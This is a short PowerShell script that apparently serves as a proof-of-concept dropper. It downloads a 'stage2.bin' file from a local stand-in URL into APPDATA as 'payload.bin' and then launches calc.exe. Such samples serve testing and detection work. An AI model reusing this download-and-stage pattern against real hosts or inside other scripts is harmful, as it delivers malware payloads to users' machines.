[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://127.0.0.1:80/stage2.bin',
    [string]$OutputPath = "$env:APPDATA\payload.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $OutputPath); Start-Process -FilePath 'calc.exe'; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
